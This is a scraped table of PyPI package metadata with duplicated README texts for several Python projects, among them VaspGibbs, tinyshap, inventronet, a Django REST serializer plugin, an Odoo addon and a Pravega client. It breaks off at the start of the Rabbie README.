All outputs can be found in the VaspGibbs.md file. It contains the following information:

#### Rotational properties
|     Property     |          Value          |
| :--------------: | :---------------------: |
|      Sigma       |            x            |
|   **P. axes**    |                         |
|       I~1        |       x        eV/THz^2 |
|       I~2        |       x        eV/THz^2 |
|       I~3        |       x        eV/THz^2 |


#### Energy corrections
|      Type      |       Z        |     E (eV)     |    S (eV/K)    |     F (eV)     |
| :------------: | :------------: | :------------: | :------------: | :------------: |
|      ZPE       |      N/A       |        x       |      N/A       |      N/A       |
|   Electronic   |        x       |        x       |        x       |        x       |
|  Vibrational   |        x       |        x       |        x       |        x       |
|   Rotational   |        x       |        x       |        x       |        x       |
| Translational  |        x       |        x       |        x       |        x       |


#### Thermodynamic Quantities
|     Quantity      |        Value        |
| :---------------: | :-----------------: |
|     Enthalpy      |          x      eV  |
|      Entropy      |          x     eV/K |
| Gibbs Free Energy |          x      eV  |
|     G - E_dft     |          x      eV  |
|        TS         |          x      eV  |

## Online Ressources

* https://pubs.acs.org/doi/abs/10.1021/jp407468t (Supporting Information)
* https://gaussian.com/thermo/
* https://wiki.fysik.dtu.dk/ase/ase/thermochemistry/thermochemistry.html
* https://chem.libretexts.org/Bookshelves/Physical_and_Theoretical_Chemistry_Textbook_Maps/Statistical_Thermodynamics_(Jeschke)/06%3A_Partition_Functions_of_Gases/6.04%3A_Rotational_Partition_Function
* https://vaspkit.com/tutorials.html#thermo-energy-correction
* https://uregina.ca/~eastalla/entropy.pdf (https://doi.org/10.1063/1.473958)

## Citation

```
@software{therrien2023vaspgibbs,
  author       = {Félix Therrien},
  title        = {{VaspGibbs: A simple way to obtain Gibbs free 
                   energy from Vasp calculations}},
  month        = apr,
  year         = 2023,
  publisher    = {Zenodo},
  version      = {v0.2.1},
  doi          = {10.5281/zenodo.7874413},
  url          = {https://doi.org/10.5281/zenodo.7874413}
}
```

## Under development

Results have been checked with [J. Phys. Chem. C 2013, 117, 49](https://pubs.acs.org/doi/abs/10.1021/jp407468t). More validation needs to be done; use with care.

*Next steps:* more testing, add to pypi, PV term for solids with Murnaghan equation, hindered translator and rotor?

Let me know if you would like new features to be added!

","


VaspGibbs



[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.7874413.svg)](https://doi.org/10.5281/zenodo.7874413)
[![PyPI](https://img.shields.io/pypi/v/vaspgibbs)](https://pypi.org/project/VaspGibbs/)

## Installation

```
pip install VaspGibbs
```
## Usage

In a folder with a finished vasp calculation, run
```
vasp_gibbs
```

`vasp_gibbs` will rerun Vasp to obtain vibration modes and output the gibbs free energy of your system.

Use `-o` (only) or `-t`(top) to specify a set of atoms for which to calculate vibration modes. Examples:

 * `-o C O` would only compute vibration modes associated with C and O keeping all other atoms fixed.
 * `-o 1 3 6` would compute vibration modes associated with the first, third and sixth atoms in the POSCAR keeping all other atoms fixed.
 * `-t 10` would compute vibration modes associated with the first 10 atoms starting from the top of the unit cell along the c axis.

This can be useful when computing free energy differences between systems where one part of the system does not change, e.g. adsorption free energies.

To run vasp in parallel call:
```
vasp_gibbs -n [number of proc] -m [mpi executable] -v [vasp executable]
```

By default `srun` and `vasp_std` are used.

VaspGibbs will automatically compute the moment of inertia and symmetry of your molecule and compute rotational and translational contributions if you specify that the system is a molecule with the `-m` flag.

The temperature and pressure can be set using the `-T` and `-P` flags.

### Output

All outputs can be found in the VaspGibbs.md file. It contains the following information:

#### Rotational properties
|     Property     |          Value          |
| :--------------: | :---------------------: |
|      Sigma       |            x            |
|   **P. axes**    |                         |
|       I~1        |       x        eV/THz^2 |
|       I~2        |       x        eV/THz^2 |
|       I~3        |       x        eV/THz^2 |


#### Energy corrections
|      Type      |       Z        |     E (eV)     |    S (eV/K)    |     F (eV)     |
| :------------: | :------------: | :------------: | :------------: | :------------: |
|      ZPE       |      N/A       |        x       |      N/A       |      N/A       |
|   Electronic   |        x       |        x       |        x       |        x       |
|  Vibrational   |        x       |        x       |        x       |        x       |
|   Rotational   |        x       |        x       |        x       |        x       |
| Translational  |        x       |        x       |        x       |        x       |


#### Thermodynamic Quantities
|     Quantity      |        Value        |
| :---------------: | :-----------------: |
|     Enthalpy      |          x      eV  |
|      Entropy      |          x     eV/K |
| Gibbs Free Energy |          x      eV  |
|     G - E_dft     |          x      eV  |
|        TS         |          x      eV  |

## Online Ressources

* https://pubs.acs.org/doi/abs/10.1021/jp407468t (Supporting Information)
* https://gaussian.com/thermo/
* https://wiki.fysik.dtu.dk/ase/ase/thermochemistry/thermochemistry.html
* https://chem.libretexts.org/Bookshelves/Physical_and_Theoretical_Chemistry_Textbook_Maps/Statistical_Thermodynamics_(Jeschke)/06%3A_Partition_Functions_of_Gases/6.04%3A_Rotational_Partition_Function
* https://vaspkit.com/tutorials.html#thermo-energy-correction
* https://uregina.ca/~eastalla/entropy.pdf (https://doi.org/10.1063/1.473958)

## Citation

```
@software{therrien2023vaspgibbs,
  author       = {Félix Therrien},
  title        = {{VaspGibbs: A simple way to obtain Gibbs free 
                   energy from Vasp calculations}},
  month        = apr,
  year         = 2023,
  publisher    = {Zenodo},
  version      = {v0.2.1},
  doi          = {10.5281/zenodo.7874413},
  url          = {https://doi.org/10.5281/zenodo.7874413}
}
```

## Under development

Results have been checked with [J. Phys. Chem. C 2013, 117, 49](https://pubs.acs.org/doi/abs/10.1021/jp407468t). More validation needs to be done; use with care.

*Next steps:* more testing, add to pypi, PV term for solids with Murnaghan equation, hindered translator and rotor?

Let me know if you would like new features to be added!

",ftherrien/vaspgibbs
myfxbook,https://github.com/isaiahbjork/myfxbook,1,0,0,,,isaiahbjork/myfxbook
tinyshap,https://github.com/tsitsimis/tinyshap,2,1096,1096,"# tinyshap
![](./assets/demo-dependency-plot.png)

A minimal implementation of the SHAP algorithm using the KernelSHAP method. In less then 100 lines of code, this repo serves as an educational resource to understand how SHAP works without all the complexities of a production-level package.

Note: For reliable and more flexible estimation of SHAP values the user should use [shap](https://github.com/slundberg/shap) or a similar package.

## Installation
```bash
pip install tinyshap
```

## Example usage
```python
from tinyshap import SHAPExplainer

# Train model
model = GradientBoostingRegressor()
model.fit(X_train, y_train)

# Explain predictions
explainer = SHAPExplainer(model.predict, X=X_train.mean().to_frame().T)
contributions = explainer.shap_values(X)
```

See complete [notebook](./notebooks/demo.ipynb)

## Resources
* [A Unified Approach to Interpreting Model Predictions (arXiv)](https://arxiv.org/abs/1705.07874)
* [Interpretable Machine Learning](https://christophm.github.io/interpretable-ml-book/shap.html#kernelshap)


## Licence
MIT
 
","# tinyshap
![](./assets/demo-dependency-plot.png)

A minimal implementation of the SHAP algorithm using the KernelSHAP method. In less then 100 lines of code, this repo serves as an educational resource to understand how SHAP works without all the complexities of a production-level package.

Note: For reliable and more flexible estimation of SHAP values the user should use [shap](https://github.com/slundberg/shap) or a similar package.

## Installation
```bash
pip install tinyshap
```

## Example usage
```python
from tinyshap import SHAPExplainer

# Train model
model = GradientBoostingRegressor()
model.fit(X_train, y_train)

# Explain predictions
explainer = SHAPExplainer(model.predict, X=X_train.mean().to_frame().T)
contributions = explainer.shap_values(X)
```

See complete [notebook](./notebooks/demo.ipynb)

## Resources
* [A Unified Approach to Interpreting Model Predictions (arXiv)](https://arxiv.org/abs/1705.07874)
* [Interpretable Machine Learning](https://christophm.github.io/interpretable-ml-book/shap.html#kernelshap)


## Licence
MIT
 
",tsitsimis/tinyshap
bullpen,https://github.com/ty-porter/Bullpen,0,361,361,"# `Bullpen`

`Bullpen` is a Python package for managing workflows and is designed to be as lightweight as possible.

## Installation

`Bullpen` is in the [Python Package Index (PyPI)](http://pypi.python.org/pypi/Bullpen/).
Installing with ``pip`` is recommended for all systems.

```sh
pip install Bullpen
```

## Contact

Tyler Porter

tyler.b.porter@gmail.com","# `Bullpen`

`Bullpen` is a Python package for managing workflows and is designed to be as lightweight as possible.

## Installation

`Bullpen` is in the [Python Package Index (PyPI)](http://pypi.python.org/pypi/Bullpen/).
Installing with ``pip`` is recommended for all systems.

```sh
pip install Bullpen
```

## Contact

Tyler Porter

tyler.b.porter@gmail.com",ty-porter/bullpen
inventronet,https://github.com/inventrohyder/inventronet,10,6143,6143,"# inventronet

inventronet is a package for building and testing neural networks in Python. 
It provides a simple and intuitive API for creating, training, 
and evaluating various types of neural network models. 
It also includes some common loss functions, activation functions, 
and metrics for neural network problems.

## Installation
You can install inventronet using pip:

```bash
pip install inventronet
```

## Usage

To use inventronet, you need to import the package and create a 
neural network object. You can then add layers, loss functions, activation 
functions, and metrics to the network. You can also specify the learning rate, 
batch size, and number of epochs for training. 
Here is an example of creating a simple feed forward neural network for a 
binary classification problem:

```python
from typing import Tuple

import matplotlib.pyplot as plt
import numpy as np

from inventronet.activations import Sigmoid, ReLU
from inventronet.layers import Dense
from inventronet.losses import BinaryCrossEntropy as BCE
from inventronet.metrics import Accuracy, Precision
from inventronet.models import Sequential
from inventronet.optimizers import StochasticGradientDescent


def plot_history(history):
    fig, axs = plt.subplots(1, len(history), figsize=(12, 4), sharex=True)

    for idx, (label, values) in enumerate(history.items()):
        axs[idx].plot(range(1, len(values) + 1), values)
        axs[idx].set_title(label)
        axs[idx].set_xlabel(""Epoch"")
        axs[idx].set_ylabel(label)
        axs[idx].grid(True)

    plt.tight_layout()
    plt.show()


epochs = 10000


def glorot_uniform(size: Tuple[int, int]) -> np.ndarray:
    input_dim, output_dim = size
    limit = np.sqrt(6 / (input_dim + output_dim))
    return np.random.uniform(low=-limit, high=limit, size=size)


# Define the input and output data
input_data = np.array([[0, 0, 1], [0, 1, 1], [1, 0, 1], [1, 1, 1]])
output_data = np.array([[0], [1], [1], [0]])

# Define the neural network with two dense layers
model = Sequential()
model.add(Dense(input_dim=3, output_dim=4, activation=ReLU(), weight_initializer=glorot_uniform))
model.add(Dense(input_dim=4, output_dim=1, activation=Sigmoid(), weight_initializer=glorot_uniform))

# Define the loss function and the metric
loss = BCE()
optimizer = StochasticGradientDescent(learning_rate=0.1)

# Compile the model with the loss function, optimizer and the metrics
model.compile(loss, optimizer, metrics=[Precision(), Accuracy()])

# Set early stopping parameters
model.set_early_stopping(patience=500, min_delta=1e-4)

# Fit the model on the training data
model.fit(input_data, output_data, epochs)

# Evaluate the model on the test data
loss_value, metric_values = model.evaluate(input_data, output_data)
metric_names = [metric.__class__.__name__ for metric in model.metrics]
metric_str = ', '.join([f""{name}: {value:.4f}"" for name, value in zip(metric_names, metric_values)])
print(f""Test Loss: {loss_value:.4f}, Test metrics: {metric_str}"")

# Plot the training history
plot_history(model.history)
```


```python
# Example of validation splitting
from typing import Tuple

import matplotlib.pyplot as plt
import numpy as np

from inventronet.activations import Sigmoid, ReLU
from inventronet.layers import Dense
from inventronet.losses import BinaryCrossEntropy as BCE
from inventronet.metrics import Accuracy, Precision
from inventronet.models import Sequential
from inventronet.optimizers import StochasticGradientDescent


def plot_history(history):
    # Get the keys for training and validation metrics
    train_keys = [key for key in history.keys() if not key.startswith(""val_"")]
    val_keys = [f""val_{key}"" for key in train_keys]

    fig, axs = plt.subplots(1, len(train_keys), figsize=(12, 4), sharex=True)

    for idx, (train_key, val_key) in enumerate(zip(train_keys, val_keys)):
        axs[idx].plot(range(1, len(history[train_key]) + 1), history[train_key], label=""Training"")
        if val_key in history:
            axs[idx].plot(range(1, len(history[val_key]) + 1), history[val_key], label=""Validation"")
        axs[idx].set_title(train_key)
        axs[idx].set_xlabel(""Epoch"")
        axs[idx].set_ylabel(train_key)
        axs[idx].legend()
        axs[idx].grid(True)

    plt.tight_layout()
    plt.show()



epochs = 10000


def glorot_uniform(size: Tuple[int, int]) -> np.ndarray:
    input_dim, output_dim = size
    limit = np.sqrt(6 / (input_dim + output_dim))
    return np.random.uniform(low=-limit, high=limit, size=size)


# Define the input and output data
input_data = np.array([[0, 0, 1], [0, 1, 1], [1, 0, 1], [1, 1, 1]])
output_data = np.array([[0], [1], [1], [0]])

# Define the neural network with two dense layers
model = Sequential()
model.add(Dense(input_dim=3, output_dim=4, activation=ReLU(), weight_initializer=glorot_uniform))
model.add(Dense(input_dim=4, output_dim=1, activation=Sigmoid(), weight_initializer=glorot_uniform))

# Define the loss function and the metric
loss = BCE()
optimizer = StochasticGradientDescent(learning_rate=0.1)

# Compile the model with the loss function, optimizer and the metrics
model.compile(loss, optimizer, metrics=[Precision(), Accuracy()])

# Set early stopping parameters
model.set_early_stopping(patience=500, min_delta=1e-4)

# Specify the validation_split parameter (e.g., 0.2 for using 20% of the data for validation)
validation_split = 0.5

# Fit the model on the training data, with validation
model.fit(input_data, output_data, epochs, validation_split=validation_split)

# Evaluate the model on the test data
loss_value, metric_values = model.evaluate(input_data, output_data)
metric_names = [metric.__class__.__name__ for metric in model.metrics]
metric_str = ', '.join([f""{name}: {value:.4f}"" for name, value in zip(metric_names, metric_values)])
print(f""Test Loss: {loss_value:.4f}, Test metrics: {metric_str}"")


# Plot the training history
plot_history(model.history)
```

## Documentation

You can find the full documentation of inventronet at https://github.com/inventrohyder/inventronet.

## License

inventronet is licensed under the MIT License. See the LICENSE file for more details.
","# inventronet

inventronet is a package for building and testing neural networks in Python. 
It provides a simple and intuitive API for creating, training, 
and evaluating various types of neural network models. 
It also includes some common loss functions, activation functions, 
and metrics for neural network problems.

## Installation
You can install inventronet using pip:

```bash
pip install inventronet
```

## Usage

To use inventronet, you need to import the package and create a 
neural network object. You can then add layers, loss functions, activation 
functions, and metrics to the network. You can also specify the learning rate, 
batch size, and number of epochs for training. 
Here is an example of creating a simple feed forward neural network for a 
binary classification problem:

```python
from typing import Tuple

import matplotlib.pyplot as plt
import numpy as np

from inventronet.activations import Sigmoid, ReLU
from inventronet.layers import Dense
from inventronet.losses import BinaryCrossEntropy as BCE
from inventronet.metrics import Accuracy, Precision
from inventronet.models import Sequential
from inventronet.optimizers import StochasticGradientDescent


def plot_history(history):
    fig, axs = plt.subplots(1, len(history), figsize=(12, 4), sharex=True)

    for idx, (label, values) in enumerate(history.items()):
        axs[idx].plot(range(1, len(values) + 1), values)
        axs[idx].set_title(label)
        axs[idx].set_xlabel(""Epoch"")
        axs[idx].set_ylabel(label)
        axs[idx].grid(True)

    plt.tight_layout()
    plt.show()


epochs = 10000


def glorot_uniform(size: Tuple[int, int]) -> np.ndarray:
    input_dim, output_dim = size
    limit = np.sqrt(6 / (input_dim + output_dim))
    return np.random.uniform(low=-limit, high=limit, size=size)


# Define the input and output data
input_data = np.array([[0, 0, 1], [0, 1, 1], [1, 0, 1], [1, 1, 1]])
output_data = np.array([[0], [1], [1], [0]])

# Define the neural network with two dense layers
model = Sequential()
model.add(Dense(input_dim=3, output_dim=4, activation=ReLU(), weight_initializer=glorot_uniform))
model.add(Dense(input_dim=4, output_dim=1, activation=Sigmoid(), weight_initializer=glorot_uniform))

# Define the loss function and the metric
loss = BCE()
optimizer = StochasticGradientDescent(learning_rate=0.1)

# Compile the model with the loss function, optimizer and the metrics
model.compile(loss, optimizer, metrics=[Precision(), Accuracy()])

# Set early stopping parameters
model.set_early_stopping(patience=500, min_delta=1e-4)

# Fit the model on the training data
model.fit(input_data, output_data, epochs)

# Evaluate the model on the test data
loss_value, metric_values = model.evaluate(input_data, output_data)
metric_names = [metric.__class__.__name__ for metric in model.metrics]
metric_str = ', '.join([f""{name}: {value:.4f}"" for name, value in zip(metric_names, metric_values)])
print(f""Test Loss: {loss_value:.4f}, Test metrics: {metric_str}"")

# Plot the training history
plot_history(model.history)
```


```python
# Example of validation splitting
from typing import Tuple

import matplotlib.pyplot as plt
import numpy as np

from inventronet.activations import Sigmoid, ReLU
from inventronet.layers import Dense
from inventronet.losses import BinaryCrossEntropy as BCE
from inventronet.metrics import Accuracy, Precision
from inventronet.models import Sequential
from inventronet.optimizers import StochasticGradientDescent


def plot_history(history):
    # Get the keys for training and validation metrics
    train_keys = [key for key in history.keys() if not key.startswith(""val_"")]
    val_keys = [f""val_{key}"" for key in train_keys]

    fig, axs = plt.subplots(1, len(train_keys), figsize=(12, 4), sharex=True)

    for idx, (train_key, val_key) in enumerate(zip(train_keys, val_keys)):
        axs[idx].plot(range(1, len(history[train_key]) + 1), history[train_key], label=""Training"")
        if val_key in history:
            axs[idx].plot(range(1, len(history[val_key]) + 1), history[val_key], label=""Validation"")
        axs[idx].set_title(train_key)
        axs[idx].set_xlabel(""Epoch"")
        axs[idx].set_ylabel(train_key)
        axs[idx].legend()
        axs[idx].grid(True)

    plt.tight_layout()
    plt.show()



epochs = 10000


def glorot_uniform(size: Tuple[int, int]) -> np.ndarray:
    input_dim, output_dim = size
    limit = np.sqrt(6 / (input_dim + output_dim))
    return np.random.uniform(low=-limit, high=limit, size=size)


# Define the input and output data
input_data = np.array([[0, 0, 1], [0, 1, 1], [1, 0, 1], [1, 1, 1]])
output_data = np.array([[0], [1], [1], [0]])

# Define the neural network with two dense layers
model = Sequential()
model.add(Dense(input_dim=3, output_dim=4, activation=ReLU(), weight_initializer=glorot_uniform))
model.add(Dense(input_dim=4, output_dim=1, activation=Sigmoid(), weight_initializer=glorot_uniform))

# Define the loss function and the metric
loss = BCE()
optimizer = StochasticGradientDescent(learning_rate=0.1)

# Compile the model with the loss function, optimizer and the metrics
model.compile(loss, optimizer, metrics=[Precision(), Accuracy()])

# Set early stopping parameters
model.set_early_stopping(patience=500, min_delta=1e-4)

# Specify the validation_split parameter (e.g., 0.2 for using 20% of the data for validation)
validation_split = 0.5

# Fit the model on the training data, with validation
model.fit(input_data, output_data, epochs, validation_split=validation_split)

# Evaluate the model on the test data
loss_value, metric_values = model.evaluate(input_data, output_data)
metric_names = [metric.__class__.__name__ for metric in model.metrics]
metric_str = ', '.join([f""{name}: {value:.4f}"" for name, value in zip(metric_names, metric_values)])
print(f""Test Loss: {loss_value:.4f}, Test metrics: {metric_str}"")


# Plot the training history
plot_history(model.history)
```

## Documentation

You can find the full documentation of inventronet at https://github.com/inventrohyder/inventronet.

## License

inventronet is licensed under the MIT License. See the LICENSE file for more details.
",inventrohyder/inventronet
drf-nested-browsable,https://github.com/pcouy/drf-nested-browsable,2,1406,1406,":warning: Work In Progress :warning:

# Writable Nested Serializers with Browsable API Forms

This plugin is intended to provide writable nested serializers (similar to [the recommended plugin from DRF documentation](https://github.com/beda-software/drf-nested-browsable.git)) that bring their own forms for the Browsable API renderer.

## Try it out

This project's dependencies are managed using [`poetry`](https://python-poetry.org/)

```bash
git clone https://github.com/pcouy/drf-nested-browsable
cd drf-nested-browsable
poetry install
cd example
poetry shell
python manage.py migrate
python manage.py runserver
```

The above commands will install the dependencies, run the DB migrations, and launch a development server of the example project that uses the provided serializers.

## Current state of the project

### Done

* Ability to write to a reverse `ForeignKey` relationship using serializer `Meta` class
* Dynamic form for `WritableNestedListSerializer` that allows adding and removing children from the Browsable API
* Arbitrary nesting depth
* Dynamically removing the parent field from serializers when used as an inner serializer
* Basic example

### To do

* Make the current example work :
  * Show `details` (`HyperlinkedIdentityField`) when displayed as a child Serializer
* Write documentation / Auto-generate it from the docstrings ([pdoc](https://pdoc.dev/) ?)
* Write tests/specs
",":warning: Work In Progress :warning:

# Writable Nested Serializers with Browsable API Forms

This plugin is intended to provide writable nested serializers (similar to [the recommended plugin from DRF documentation](https://github.com/beda-software/drf-nested-browsable.git)) that bring their own forms for the Browsable API renderer.

## Try it out

This project's dependencies are managed using [`poetry`](https://python-poetry.org/)

```bash
git clone https://github.com/pcouy/drf-nested-browsable
cd drf-nested-browsable
poetry install
cd example
poetry shell
python manage.py migrate
python manage.py runserver
```

The above commands will install the dependencies, run the DB migrations, and launch a development server of the example project that uses the provided serializers.

## Current state of the project

### Done

* Ability to write to a reverse `ForeignKey` relationship using serializer `Meta` class
* Dynamic form for `WritableNestedListSerializer` that allows adding and removing children from the Browsable API
* Arbitrary nesting depth
* Dynamically removing the parent field from serializers when used as an inner serializer
* Basic example

### To do

* Make the current example work :
  * Show `details` (`HyperlinkedIdentityField`) when displayed as a child Serializer
* Write documentation / Auto-generate it from the docstrings ([pdoc](https://pdoc.dev/) ?)
* Write tests/specs
",pcouy/drf-nested-browsable
odoo-addon-purchase-report-shipping-address,https://github.com/OCA/purchase-reporting,1,3236,2881,"================================
Purchase Report Shipping Address
================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fpurchase--reporting-lightgray.png?logo=github
    :target: https://github.com/OCA/purchase-reporting/tree/16.0/purchase_report_shipping_address
    :alt: OCA/purchase-reporting
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/purchase-reporting-16-0/purchase-reporting-16-0-purchase_report_shipping_address
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/141/16.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module adds the translatable Warehouse Address Details field in warehouse to show in purchase reports.

Purchase documents are printed in supplier's language, however Odoo by default does not
come with the ability to present the warehouse address in different languages.
This module intends to take care of this shortcoming.

**Table of contents**

.. contents::
   :local:

Configuration
=============

#. Go to *Inventory > Configuration > Warehouses* and open a warehouse record for which
the address presentation should be adjusted for purchase reports.
#. Update Warehouse Address Details field.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/purchase-reporting/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/purchase-reporting/issues/new?body=module:%20purchase_report_shipping_address%0Aversion:%2016.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Quartile Limited

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/purchase-reporting <https://github.com/OCA/purchase-reporting/tree/16.0/purchase_report_shipping_address>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","================================
Purchase Report Shipping Address
================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fpurchase--reporting-lightgray.png?logo=github
    :target: https://github.com/OCA/purchase-reporting/tree/16.0/purchase_report_shipping_address
    :alt: OCA/purchase-reporting
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/purchase-reporting-16-0/purchase-reporting-16-0-purchase_report_shipping_address
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/141/16.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module adds the translatable Warehouse Address Details field in warehouse to show in purchase reports.

Purchase documents are printed in supplier's language, however Odoo by default does not
come with the ability to present the warehouse address in different languages.
This module intends to take care of this shortcoming.

**Table of contents**

.. contents::
   :local:

Configuration
=============

#. Go to *Inventory > Configuration > Warehouses* and open a warehouse record for which
the address presentation should be adjusted for purchase reports.
#. Update Warehouse Address Details field.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Quartile Limited

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/purchase-reporting `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/purchase-reporting
saipravega,https://github.com/kotlasaicharanreddy/pravega-client-rust,0,2550,2550,"![CIbuild](https://github.com/pravega/pravega-client-rust/workflows/CIbuild/badge.svg)
[![codecov](https://codecov.io/gh/pravega/pravega-client-rust/branch/master/graph/badge.svg?token=XEjqMkINCV)](https://codecov.io/gh/pravega/pravega-client-rust)

# Pravega Python client.

This project provides a way to interact with [Pravega](http://pravega.io) using Python client.

Pravega is an open source distributed storage service implementing Streams. It offers Stream as the main primitive for 
the foundation of reliable storage systems: a high-performance, durable, elastic, and unlimited append-only byte stream 
with strict ordering and consistency.

This project supports interaction with Pravega for Python versions 3.8+. For a quick tutorial on the Python bindings 
visit the [book](https://pravega.github.io/pravega-client-rust/Python/PythonBindings.html).

Also check out the Pravega Python client [API documents](https://pravega.github.io/pravega-client-rust/python/pravega_client.html).
## Install

The client library can be installed using pip.
```shell
pip install pravega
```
The users can also choose to generate the bindings using the commands specified at [PythonBinding](./PythonBinding.md) .

## Example
### Write events
```python
import pravega_client
# assuming Pravega controller is listening at 127.0.0.1:9090
stream_manager = pravega_client.StreamManager(""tcp://127.0.0.1:9090"")

scope_result = stream_manager.create_scope(""scope_foo"")
self.assertEqual(True, scope_result, ""Scope creation status"")

stream_result = stream_manager.create_stream(""scope_foo"", ""stream_bar"", 1) # initially stream contains 1 segment
self.assertEqual(True, stream_result, ""Stream creation status"")

writer = stream_manager.create_writer(""scope_foo"",""stream_bar"")
writer.write_event(""hello world"")
```
### Read events
```python
import pravega_client
# assuming Pravega controller is listening at 127.0.0.1:9090
stream_manager = pravega_client.StreamManager(""tcp://127.0.0.1:9090"")

reader_group = stream_manager.create_reader_group(""my_reader_group"", ""scope_foo"", ""stream_bar"")

reader = reader_group.create_reader(""my_reader"");

# acquire a segment slice to read
slice = await reader.get_segment_slice_async()
for event in slice:
    print(event.data())
    
# after calling release segment, data in this segment slice will not be read again by
# readers in the same reader group.
reader.release_segment(slice)

# remember to mark the finished reader as offline.
reader.reader_offline()
```
","![CIbuild](https://github.com/pravega/pravega-client-rust/workflows/CIbuild/badge.svg)
[![codecov](https://codecov.io/gh/pravega/pravega-client-rust/branch/master/graph/badge.svg?token=XEjqMkINCV)](https://codecov.io/gh/pravega/pravega-client-rust)

# Pravega Python client.

This project provides a way to interact with [Pravega](http://pravega.io) using Python client.

Pravega is an open source distributed storage service implementing Streams. It offers Stream as the main primitive for 
the foundation of reliable storage systems: a high-performance, durable, elastic, and unlimited append-only byte stream 
with strict ordering and consistency.

This project supports interaction with Pravega for Python versions 3.8+. For a quick tutorial on the Python bindings 
visit the [book](https://pravega.github.io/pravega-client-rust/Python/PythonBindings.html).

Also check out the Pravega Python client [API documents](https://pravega.github.io/pravega-client-rust/python/pravega_client.html).
## Install

The client library can be installed using pip.
```shell
pip install pravega
```
The users can also choose to generate the bindings using the commands specified at [PythonBinding](./PythonBinding.md) .

## Example
### Write events
```python
import pravega_client
# assuming Pravega controller is listening at 127.0.0.1:9090
stream_manager = pravega_client.StreamManager(""tcp://127.0.0.1:9090"")

scope_result = stream_manager.create_scope(""scope_foo"")
self.assertEqual(True, scope_result, ""Scope creation status"")

stream_result = stream_manager.create_stream(""scope_foo"", ""stream_bar"", 1) # initially stream contains 1 segment
self.assertEqual(True, stream_result, ""Stream creation status"")

writer = stream_manager.create_writer(""scope_foo"",""stream_bar"")
writer.write_event(""hello world"")
```
### Read events
```python
import pravega_client
# assuming Pravega controller is listening at 127.0.0.1:9090
stream_manager = pravega_client.StreamManager(""tcp://127.0.0.1:9090"")

reader_group = stream_manager.create_reader_group(""my_reader_group"", ""scope_foo"", ""stream_bar"")

reader = reader_group.create_reader(""my_reader"");

# acquire a segment slice to read
slice = await reader.get_segment_slice_async()
for event in slice:
    print(event.data())
    
# after calling release segment, data in this segment slice will not be read again by
# readers in the same reader group.
reader.release_segment(slice)

# remember to mark the finished reader as offline.
reader.reader_offline()
```
",kotlasaicharanreddy/pravega-client-rust
rabbie,https://github.com/scuffi/rabbie,4,7464,7054,"
# <p align=""center"">🥕 Rabbie 🥕</p>


<p align=""center"">
<img alt=""GitHub last commit"" src=""https://img.shields.io/github/last-commit/scuffi/rabbie""> <img alt=""PyPI - Python Version"" src=""https://img.shields.io/pypi/pyversions/rabbie""> <img alt=""GitHub"" src=""https://img.shields.io/github/license/scuffi/rabbie""> <a href=""https://pypi.org/project/rabbie/""><img alt=""PyPI"" src=""https://img.shields.io/pypi/v/rabbie""></a>
</p>


